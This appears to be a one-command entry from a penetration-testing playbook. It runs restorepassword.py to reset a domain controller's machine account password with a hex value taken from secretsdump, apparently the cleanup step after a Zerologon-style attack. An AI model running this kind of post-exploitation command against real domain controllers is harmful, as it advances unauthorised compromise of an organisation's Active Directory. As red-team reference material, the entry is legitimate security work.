---
id: b4739cfb-8abf-4b98-91a6-b5b5a60b091c
name: Restore password from secretsdump
type: command
executor: bash
data: python restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hexpass
  e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3
output: null
created_at: '2023-04-06T03:56:02.673109+00:00'
updated_at: '2023-04-10T20:36:01.289773+00:00'
---

# Restore password from secretsdump

```bash
python restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3
```


